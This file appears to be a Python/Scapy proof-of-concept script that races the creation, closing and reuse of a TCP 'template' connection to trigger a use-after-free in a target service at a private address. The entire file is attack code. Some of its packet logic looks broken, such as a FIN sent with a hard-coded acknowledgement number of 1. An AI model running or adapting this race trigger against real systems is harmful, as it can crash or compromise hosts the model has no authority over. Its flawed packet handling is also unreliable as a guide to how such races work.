# test-uaf-control.py
from scapy.all import *
import threading
import time

src = "10.0.2.1"
dst = "10.0.2.105"
sport = 12345
dport = 8000

def create_template():
    # Establish a persistent connection to create a template
    syn = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags='S', seq=1000)
    synack = sr1(syn, timeout=2, verbose=0)
    if not synack or not synack.haslayer(TCP) or synack[TCP].flags != 'SA':
        print("No SYN-ACK received")
        return
    ack = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags='A', seq=1001, ack=synack[TCP].seq+1)
    send(ack)
    print("Template connection established.")

def race_free_template():
    # Try to close the template connection quickly
    time.sleep(0.1)
    fin = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags='F', seq=1001, ack=1)
    send(fin)
    print("Sent FIN to close template.")

def use_template():
    # Try to create a new connection that will reference the template
    time.sleep(0.2)
    syn2 = IP(src=src, dst=dst)/TCP(sport=sport+1, dport=dport, flags='S', seq=2000)
    synack2 = sr1(syn2, timeout=2, verbose=0)
    if synack2 and synack2.haslayer(TCP) and synack2[TCP].flags == 'SA':
        ack2 = IP(src=src, dst=dst)/TCP(sport=sport+1, dport=dport, flags='A', seq=2001, ack=synack2[TCP].seq+1)
        send(ack2)
        print("New connection referencing template established.")

# Run threads to race template free and use
t1 = threading.Thread(target=create_template)
t2 = threading.Thread(target=race_free_template)
t3 = threading.Thread(target=use_template)

t1.start()
t2.start()
t3.start()
t1.join()
t2.join()
t3.join()